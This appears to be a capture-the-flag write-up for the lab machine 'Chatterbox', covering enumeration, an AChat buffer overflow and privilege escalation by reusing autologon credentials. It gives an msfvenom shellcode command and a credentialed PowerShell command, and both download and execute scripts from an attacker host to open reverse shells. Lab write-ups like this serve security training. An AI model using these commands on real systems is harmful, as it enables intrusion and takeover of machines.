@@ -1,0 +1,64 @@
+Chatterbox
+
+16t h June 2018 / Document No D18.100.07
+
+Prepared By: Alexander Reid (Arrexel)
+Machine Author: lkys37en
+Difficulty: Easy
+Classification: Official
+
+                                                                         Page 1 / 5
+SYNOPSIS
+
+Chatterbox is a fairly straightforward machine that requires basic exploit modification or
+Metasploit troubleshooting skills to complete.
+
+Skills Required                          Skills Learned
+
+     Beginner/intermediate knowledge of       Modifying publicly available exploits
+         Linux                                Basic PowerShell reverse shell
+
+     Beginner/intermediate knowledge of           techniques
+         PowerShell                           Enumerating Windows Registry
+
+                                         Page 2 / 5
+Enumeration
+Nmap
+
+Nmap finds only AChat running on the machine.
+
+                                               Page 3 / 5
+Exploitation
+AChat Buffer Overflow
+
+Exploit: h ttps://www.exploit-db.com/exploits/36025/
+Using msfvenom, it is possible to generate shellcode for use in the above exploit. The command
+msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object
+Net.WebClient).downloadString('http://<LABIP>/writeup.ps1')\"" -e x86/unicode_mixed -b
+'\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\
+x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa
+9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\
+xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\x
+d5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea
+\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
+BufferRegister=EAX -f python will generate shellcode which downloads and executes a
+powershell script from the attacking machine. Opening a reverse shell is fairly trivial.
+
+                                                                                                                   Page 4 / 5
+Privilege Escalation
+Administrator
+
+PowerUp: h ttps://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+Running PowerUp reveals a set of Autologon credentials hidden in the registry.
+
+Attempting to re-use this password with the Administrator account is successful, and can be
+achieved using powershell or by opening SMB and using impacket's psexec. Using powershell,
+the command $ passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;$creds =
+New-Object System.Management.Automation.PSCredential('administrator' $passwd) will store
+the credentials in $creds for the session. A reverse shell can now be opened with the supplied
+credentials using the command Start-Process -FilePath "powershell" -argumentlist
+"IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential
+$creds
+
+                                                                                                                   Page 5 / 5
+
